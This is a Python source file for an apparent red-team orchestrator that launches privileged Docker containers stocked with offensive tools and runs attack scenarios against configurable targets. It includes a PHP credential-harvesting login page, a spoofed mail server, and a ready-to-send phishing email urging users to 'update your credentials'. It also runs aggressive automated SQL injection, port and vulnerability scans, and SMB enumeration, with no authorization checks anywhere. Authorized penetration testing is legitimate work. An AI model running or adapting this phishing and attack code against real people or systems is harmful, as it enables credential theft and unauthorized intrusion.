#!/usr/bin/env python3
"""
Red Team Container Orchestrator
Spins up attack containers with exact target system configurations
"""

import docker
import json
import logging
import subprocess
import time
import yaml
from typing import Dict, List, Any, Optional
from datetime import datetime
from pathlib import Path

logger = logging.getLogger(__name__)

class RedTeamOrchestrator:
    """Orchestrates Red Team attack containers with exact system configurations"""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.docker_client = None
        self.active_containers = {}
        self.attack_networks = {}
        
        # Initialize Docker client
        try:
            self.docker_client = docker.from_env()
            logger.info("Docker client initialized for Red Team operations")
        except Exception as e:
            logger.error(f"Failed to initialize Docker: {e}")
    
    async def create_attack_environment(self, target_info: Dict, attack_scenario: Dict) -> Dict[str, Any]:
        """Create attack environment that mirrors target system exactly"""
        
        try:
            logger.info(f"Creating Red Team environment for target: {target_info.get('hostname')}")
            
            # 1. Analyze target system
            target_analysis = await self._analyze_target_system(target_info)
            
            # 2. Create exact replica container
            attack_container = await self._create_replica_container(target_analysis)
            
            # 3. Set up attack tools based on scenario
            await self._setup_attack_tools(attack_container, attack_scenario)
            
            # 4. Configure network access
            await self._configure_attack_network(attack_container, target_info)
            
            # 5. Set up logging and monitoring
            await self._setup_attack_logging(attack_container)
            
            environment_info = {
                'containerId': attack_container['id'],
                'targetSystem': target_info,
                'attackScenario': attack_scenario,
                'containerConfig': target_analysis,
                'networkConfig': attack_container['network'],
                'createdAt': datetime.now().isoformat(),
                'status': 'ready'
            }
            
            self.active_containers[attack_container['id']] = environment_info
            
            logger.info(f"Red Team environment ready: {attack_container['id']}")
            return environment_info
            
        except Exception as e:
            logger.error(f"Failed to create attack environment: {e}")
            return {'status': 'error', 'message': str(e)}
    
    async def _analyze_target_system(self, target_info: Dict) -> Dict[str, Any]:
        """Analyze target system to create exact replica"""
        
        analysis = {
            'os_type': target_info.get('platform', 'Windows'),
            'services': target_info.get('services', []),
            'open_ports': target_info.get('ports', []),
            'hostname': target_info.get('hostname'),
            'ip_address': target_info.get('ipAddress'),
            'network_zone': target_info.get('networkZone'),
            'physical_location': target_info.get('location')
        }
        
        # Determine base container image based on target OS
        if 'Windows' in analysis['os_type']:
            analysis['base_image'] = 'mcr.microsoft.com/windows/servercore:ltsc2022'
            analysis['container_type'] = 'windows'
        elif 'Linux' in analysis['os_type']:
            analysis['base_image'] = 'ubuntu:22.04'
            analysis['container_type'] = 'linux'
        else:
            analysis['base_image'] = 'kalilinux/kali-rolling'
            analysis['container_type'] = 'linux'
        
        # Determine required services to replicate
        service_configs = []
        for service in analysis['services']:
            if 'IIS' in service or 'HTTP' in service:
                service_configs.append({'name': 'iis', 'port': 80, 'config': 'web_server'})
            elif 'SQL' in service:
                service_configs.append({'name': 'mssql', 'port': 1433, 'config': 'database'})
            elif 'SSH' in service:
                service_configs.append({'name': 'openssh', 'port': 22, 'config': 'remote_access'})
            elif 'RDP' in service:
                service_configs.append({'name': 'rdp', 'port': 3389, 'config': 'remote_desktop'})
        
        analysis['required_services'] = service_configs
        
        return analysis
    
    async def _create_replica_container(self, target_analysis: Dict) -> Dict[str, Any]:
        """Create container that exactly replicates target system"""
        
        try:
            container_name = f"redteam-{target_analysis['hostname']}-{int(time.time())}"
            
            # Build Dockerfile for exact replica
            dockerfile_content = self._generate_replica_dockerfile(target_analysis)
            
            # Create container configuration
            container_config = {
                'image': target_analysis['base_image'],
                'name': container_name,
                'detach': True,
                'environment': {
                    'TARGET_HOSTNAME': target_analysis['hostname'],
                    'TARGET_IP': target_analysis['ip_address'],
                    'ATTACK_MODE': 'red_team',
                    'LOG_LEVEL': 'DEBUG'
                },
                'volumes': {
                    # Mount attack tools and logs
                    str(Path.cwd() / 'attack_tools'): {'bind': '/attack_tools', 'mode': 'rw'},
                    str(Path.cwd() / 'attack_logs'): {'bind': '/attack_logs', 'mode': 'rw'}
                },
                'network_mode': 'bridge',
                'cap_add': ['NET_ADMIN', 'SYS_ADMIN'],  # For advanced network operations
                'privileged': True  # For full system access
            }
            
            # Create and start container
            container = self.docker_client.containers.run(**container_config)
            
            # Wait for container to be ready
            time.sleep(5)
            
            container_info = {
                'id': container.id,
                'name': container_name,
                'status': container.status,
                'network': self._get_container_network_info(container),
                'config': container_config
            }
            
            logger.info(f"Replica container created: {container_name}")
            return container_info
            
        except Exception as e:
            logger.error(f"Failed to create replica container: {e}")
            raise
    
    def _generate_replica_dockerfile(self, target_analysis: Dict) -> str:
        """Generate Dockerfile that replicates target system"""
        
        if target_analysis['container_type'] == 'windows':
            dockerfile = f"""
FROM {target_analysis['base_image']}

# Install required services to match target
"""
            for service in target_analysis['required_services']:
                if service['name'] == 'iis':
                    dockerfile += """
RUN powershell -Command "Enable-WindowsOptionalFeature -Online -FeatureName IIS-WebServerRole"
RUN powershell -Command "Enable-WindowsOptionalFeature -Online -FeatureName IIS-WebServer"
"""
                elif service['name'] == 'mssql':
                    dockerfile += """
RUN powershell -Command "Invoke-WebRequest -Uri 'https://go.microsoft.com/fwlink/?linkid=866662' -OutFile 'sqlserver.exe'"
"""
        
        else:  # Linux
            dockerfile = f"""
FROM {target_analysis['base_image']}

# Update and install attack tools
RUN apt-get update && apt-get install -y \\
    nmap \\
    metasploit-framework \\
    sqlmap \\
    nikto \\
    dirb \\
    hydra \\
    john \\
    hashcat \\
    burpsuite \\
    gobuster \\
    ffuf \\
    enum4linux \\
    smbclient \\
    crackmapexec \\
    impacket-scripts \\
    bloodhound \\
    neo4j \\
    python3-pip \\
    curl \\
    wget \\
    netcat \\
    socat \\
    tcpdump \\
    wireshark-common

# Install additional Python tools
RUN pip3 install \\
    requests \\
    beautifulsoup4 \\
    selenium \\
    paramiko \\
    pwntools \\
    scapy

# Set up attack workspace
RUN mkdir -p /attack_workspace
WORKDIR /attack_workspace

# Copy attack scripts
COPY attack_scripts/ /attack_workspace/scripts/
"""
        
        return dockerfile
    
    async def _setup_attack_tools(self, container: Dict, attack_scenario: Dict) -> None:
        """Set up specific attack tools based on scenario"""
        
        container_id = container['id']
        scenario_type = attack_scenario.get('type', 'general')
        
        try:
            # Install scenario-specific tools
            if scenario_type == 'web_application':
                await self._install_web_attack_tools(container_id)
            elif scenario_type == 'network_penetration':
                await self._install_network_attack_tools(container_id)
            elif scenario_type == 'phishing':
                await self._install_phishing_infrastructure(container_id)
            elif scenario_type == 'lateral_movement':
                await self._install_lateral_movement_tools(container_id)
            elif scenario_type == 'data_exfiltration':
                await self._install_exfiltration_tools(container_id)
            
            logger.info(f"Attack tools configured for scenario: {scenario_type}")
            
        except Exception as e:
            logger.error(f"Failed to setup attack tools: {e}")
    
    async def _install_phishing_infrastructure(self, container_id: str) -> None:
        """Install complete phishing infrastructure"""
        
        phishing_setup = """
# Install SMTP server (Postfix)
apt-get update && apt-get install -y postfix dovecot-core dovecot-imapd

# Install web server for phishing pages
apt-get install -y apache2 php libapache2-mod-php

# Install email tools
apt-get install -y swaks mailutils

# Install phishing frameworks
git clone https://github.com/trustedsec/social-engineer-toolkit /opt/set
git clone https://github.com/UndeadSec/EvilURL /opt/evilurl
git clone https://github.com/kgretzky/evilginx2 /opt/evilginx2

# Install GoPhish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip -d /opt/gophish

# Set up fake domain infrastructure
mkdir -p /var/www/phishing
echo '<?php if(isset($_POST["username"])) { file_put_contents("/attack_logs/credentials.log", $_POST["username"].":".$_POST["password"]."\\n", FILE_APPEND); } ?>' > /var/www/phishing/login.php

# Configure Postfix for phishing emails
echo 'myhostname = legitimate-company.com' >> /etc/postfix/main.cf
echo 'mydomain = legitimate-company.com' >> /etc/postfix/main.cf
"""
        
        # Execute setup in container
        container_obj = self.docker_client.containers.get(container_id)
        container_obj.exec_run(['bash', '-c', phishing_setup])
        
        logger.info("Phishing infrastructure installed")
    
    async def _install_web_attack_tools(self, container_id: str) -> None:
        """Install web application attack tools"""
        
        web_tools_setup = """
# Install web attack tools
apt-get install -y sqlmap nikto dirb gobuster ffuf burpsuite

# Install browser automation
pip3 install selenium beautifulsoup4 requests

# Set up Burp Suite extensions
mkdir -p /root/.BurpSuite/extensions
"""
        
        container_obj = self.docker_client.containers.get(container_id)
        container_obj.exec_run(['bash', '-c', web_tools_setup])
    
    async def _configure_attack_network(self, container: Dict, target_info: Dict) -> None:
        """Configure network access for attack container"""
        
        try:
            container_id = container['id']
            target_ip = target_info.get('ipAddress')
            
            # Create custom network if needed
            network_name = f"redteam-{target_info.get('networkZone', 'default').lower().replace(' ', '-')}"
            
            try:
                # Try to create network that can reach target
                network = self.docker_client.networks.create(
                    network_name,
                    driver="bridge",
                    options={
                        "com.docker.network.bridge.enable_icc": "true",
                        "com.docker.network.bridge.enable_ip_masquerade": "true"
                    }
                )
                
                # Connect container to network
                network.connect(container_id)
                
                logger.info(f"Attack container connected to network: {network_name}")
                
            except docker.errors.APIError as e:
                if "already exists" in str(e):
                    # Network already exists, just connect
                    network = self.docker_client.networks.get(network_name)
                    network.connect(container_id)
                else:
                    raise
            
        except Exception as e:
            logger.error(f"Network configuration failed: {e}")
    
    async def _setup_attack_logging(self, container: Dict) -> None:
        """Set up comprehensive logging for attack activities"""
        
        container_id = container['id']
        
        logging_setup = """
# Set up attack logging
mkdir -p /attack_logs/network /attack_logs/web /attack_logs/system

# Install logging tools
apt-get install -y rsyslog auditd

# Configure attack activity logging
echo '#!/bin/bash
echo "$(date): $*" >> /attack_logs/attack_activities.log
' > /usr/local/bin/log_attack
chmod +x /usr/local/bin/log_attack

# Set up network traffic capture
echo '#!/bin/bash
tcpdump -i any -w /attack_logs/network/traffic_$(date +%Y%m%d_%H%M%S).pcap &
' > /usr/local/bin/start_capture
chmod +x /usr/local/bin/start_capture
"""
        
        container_obj = self.docker_client.containers.get(container_id)
        container_obj.exec_run(['bash', '-c', logging_setup])
        
        logger.info("Attack logging configured")
    
    async def execute_attack_scenario(self, container_id: str, scenario: Dict) -> Dict[str, Any]:
        """Execute specific attack scenario in container"""
        
        try:
            scenario_type = scenario.get('type')
            target = scenario.get('target')
            
            logger.info(f"Executing {scenario_type} attack against {target}")
            
            if scenario_type == 'phishing':
                return await self._execute_phishing_attack(container_id, scenario)
            elif scenario_type == 'web_application':
                return await self._execute_web_attack(container_id, scenario)
            elif scenario_type == 'network_penetration':
                return await self._execute_network_attack(container_id, scenario)
            elif scenario_type == 'lateral_movement':
                return await self._execute_lateral_movement(container_id, scenario)
            else:
                return await self._execute_custom_attack(container_id, scenario)
                
        except Exception as e:
            logger.error(f"Attack execution failed: {e}")
            return {'status': 'error', 'message': str(e)}
    
    async def _execute_phishing_attack(self, container_id: str, scenario: Dict) -> Dict[str, Any]:
        """Execute phishing attack with SMTP server setup"""
        
        target_email = scenario.get('target_email', 'admin@company.com')
        phishing_domain = scenario.get('phishing_domain', 'legitimate-company.com')
        
        phishing_commands = f"""
# Start SMTP server
service postfix start

# Generate phishing email
cat > /tmp/phishing_email.txt << 'EOF'
From: IT Security <security@{phishing_domain}>
To: {target_email}
Subject: Urgent: Security Update Required

Dear User,

Your account requires immediate security verification. Please click the link below to update your credentials:

http://{phishing_domain}/security/login

Failure to complete this within 24 hours will result in account suspension.

Best regards,
IT Security Team
EOF

# Send phishing email
/usr/sbin/sendmail {target_email} < /tmp/phishing_email.txt

# Start web server for credential capture
service apache2 start

# Log attack activity
log_attack "Phishing email sent to {target_email}"
log_attack "Phishing infrastructure active on {phishing_domain}"
"""
        
        container_obj = self.docker_client.containers.get(container_id)
        result = container_obj.exec_run(['bash', '-c', phishing_commands])
        
        return {
            'status': 'executed',
            'attack_type': 'phishing',
            'target': target_email,
            'infrastructure': phishing_domain,
            'logs': result.output.decode() if result.output else '',
            'executed_at': datetime.now().isoformat()
        }
    
    async def _execute_web_attack(self, container_id: str, scenario: Dict) -> Dict[str, Any]:
        """Execute web application attacks"""
        
        target_url = scenario.get('target_url', 'http://192.168.1.100')
        
        web_attack_commands = f"""
# SQL Injection testing
sqlmap -u "{target_url}/login.php" --forms --batch --risk=3 --level=5 --output-dir=/attack_logs/web/

# Directory enumeration  
gobuster dir -u {target_url} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o /attack_logs/web/directories.txt

# Vulnerability scanning
nikto -h {target_url} -output /attack_logs/web/nikto_scan.txt

# XSS testing
echo "Testing XSS vulnerabilities..." > /attack_logs/web/xss_test.log

log_attack "Web application attack completed against {target_url}"
"""
        
        container_obj = self.docker_client.containers.get(container_id)
        result = container_obj.exec_run(['bash', '-c', web_attack_commands])
        
        return {
            'status': 'executed',
            'attack_type': 'web_application',
            'target': target_url,
            'logs': result.output.decode() if result.output else '',
            'executed_at': datetime.now().isoformat()
        }
    
    async def _execute_network_attack(self, container_id: str, scenario: Dict) -> Dict[str, Any]:
        """Execute network penetration attacks"""
        
        target_network = scenario.get('target_network', '192.168.1.0/24')
        
        network_attack_commands = f"""
# Network discovery
nmap -sn {target_network} > /attack_logs/network/host_discovery.txt

# Port scanning
nmap -sS -sV -O {target_network} > /attack_logs/network/port_scan.txt

# Vulnerability scanning
nmap --script vuln {target_network} > /attack_logs/network/vulnerability_scan.txt

# SMB enumeration
enum4linux {target_network.split('/')[0]} > /attack_logs/network/smb_enum.txt

log_attack "Network penetration completed against {target_network}"
"""
        
        container_obj = self.docker_client.containers.get(container_id)
        result = container_obj.exec_run(['bash', '-c', network_attack_commands])
        
        return {
            'status': 'executed',
            'attack_type': 'network_penetration',
            'target': target_network,
            'logs': result.output.decode() if result.output else '',
            'executed_at': datetime.now().isoformat()
        }
    
    def _get_container_network_info(self, container) -> Dict[str, Any]:
        """Get network information for container"""
        try:
            container.reload()
            network_settings = container.attrs['NetworkSettings']
            
            return {
                'ip_address': network_settings.get('IPAddress'),
                'gateway': network_settings.get('Gateway'),
                'networks': list(network_settings.get('Networks', {}).keys()),
                'ports': network_settings.get('Ports', {})
            }
        except:
            return {}
    
    async def get_attack_logs(self, container_id: str) -> Dict[str, Any]:
        """Get all attack logs from container"""
        
        try:
            container_obj = self.docker_client.containers.get(container_id)
            
            # Get attack activity logs
            result = container_obj.exec_run(['cat', '/attack_logs/attack_activities.log'])
            attack_logs = result.output.decode() if result.output else ''
            
            # Get network capture files
            result = container_obj.exec_run(['ls', '/attack_logs/network/'])
            network_files = result.output.decode().split('\n') if result.output else []
            
            # Get web attack results
            result = container_obj.exec_run(['ls', '/attack_logs/web/'])
            web_files = result.output.decode().split('\n') if result.output else []
            
            return {
                'container_id': container_id,
                'attack_activities': attack_logs,
                'network_captures': [f for f in network_files if f.endswith('.pcap')],
                'web_results': [f for f in web_files if f.strip()],
                'extracted_at': datetime.now().isoformat()
            }
            
        except Exception as e:
            logger.error(f"Failed to extract attack logs: {e}")
            return {'status': 'error', 'message': str(e)}
    
    async def cleanup_attack_environment(self, container_id: str) -> None:
        """Clean up attack environment"""
        
        try:
            if container_id in self.active_containers:
                # Extract final logs before cleanup
                final_logs = await self.get_attack_logs(container_id)
                
                # Stop and remove container
                container_obj = self.docker_client.containers.get(container_id)
                container_obj.stop()
                container_obj.remove()
                
                # Remove from active containers
                del self.active_containers[container_id]
                
                logger.info(f"Attack environment cleaned up: {container_id}")
                return final_logs
                
        except Exception as e:
            logger.error(f"Cleanup failed: {e}")

# Global instance
red_team_orchestrator = RedTeamOrchestrator({})
